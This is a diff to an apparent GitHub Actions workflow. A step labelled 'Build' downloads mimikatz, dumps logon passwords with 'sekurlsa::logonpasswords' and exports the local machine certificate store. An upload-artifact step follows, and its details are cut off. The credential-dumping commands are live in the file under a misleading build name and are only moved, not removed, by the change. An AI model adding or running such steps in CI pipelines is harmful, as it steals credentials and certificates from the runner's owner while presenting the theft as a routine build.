@@ -9,10 +9,11 @@ jobs:
       - uses: actions/checkout@v2
       - name: Build
         run: |
+          mkdir .\mimi\
           Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip' -OutFile mimi.zip
-          Expand-Archive mimi.zip -DestinationPath .\
-          .\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
-          .\x64\mimikatz.exe log version "crypto::certificates /systemstore:local_machine" exit
+          Expand-Archive mimi.zip -DestinationPath .\mimi\
+          .\mimi\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+          .\mimi\x64\mimikatz.exe log version "crypto::certificates /systemstore:local_machine" exit
 
       - uses: actions/upload-artifact@v3
         with:
